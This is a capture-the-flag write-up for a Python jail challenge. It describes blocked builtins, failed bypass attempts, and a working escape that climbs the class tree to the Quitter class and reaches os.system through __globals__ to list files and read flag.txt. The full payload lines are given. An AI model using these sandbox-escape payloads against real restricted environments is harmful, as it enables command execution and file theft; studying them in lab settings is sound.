# Prison Break

**Category:** Pwn / Jailbreak

---

## Challenge Description

> Welcome to the most secure Python environment! Most dangerous functions have been removed for your safety. Can you break free and claim the flag?

The challenge provides a "secure" Python 3.9 environment. The objective is to bypass the restrictions placed on the Python interpreter to read the contents of `flag.txt`.

---

## Analysis

### Initial Reconnaissance

Upon connection via `nc`, we conducted several tests to define the boundaries of the "Prison":

| Test | Result |
|------|--------|
| `open()`, `exec()`, `eval()`, `__import__` | Blocked with error: "You have encountered an error" |
| `dir()`, `getattr()` | Blocked (broad restriction on exploitation keywords) |
| `help()` | **Accessible!** |

Using `help()` → `modules`, we confirmed that `os`, `sys`, and `subprocess` were present on the underlying system but couldn't be imported directly.

### Failed Approaches

| Attempt | Result |
|---------|--------|
| `__builtins__.__dict__["pr"+"int"]` | Blocked — environment monitored `__builtins__` access |
| `getattr(__builtins__, 'open')` | Blocked — `getattr` was blacklisted |
| `().__class__.__base__.__subclasses__()[140]` | Unreliable — indices change between Python versions |

---

## Solution

### The Bypass: Class Tree Climbing

To escape, we access the `os` module through the Python object hierarchy via classes already loaded into the runtime.

### Step 1: Finding the "Quitter" Class

The `Quitter` class is tied to `exit()`/`quit()` functions and maintains a reference to the `sys` module.

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter']
```

### Step 2: Accessing Global Namespaces

Once located, access its `__init__` function's `__globals__` dictionary containing references to all modules.

### Step 3: Server Reconnaissance

Leverage `sys` to access `sys.modules['os']` for shell command execution:

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter'][0].__init__.__globals__['sys'].modules['os'].system('ls -R')
```

**Output:**
```
./challenge:
flag.txt
jail.py
```

### Step 4: Flag Recovery

With the exact path known, combine subclass escalation with `cat`:

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter'][0].__init__.__globals__['sys'].modules['os'].system('cat challenge/flag.txt')
```

---

## Key Takeaways

- The `help()` utility can reveal available modules in restricted environments
- Class tree climbing via `__subclasses__()` bypasses direct import restrictions
- Search for classes by name instead of guessing indices (more reliable)
- The `Quitter` class is a common escape vector for Python jails
- Always perform reconnaissance (`ls -R`) to locate target files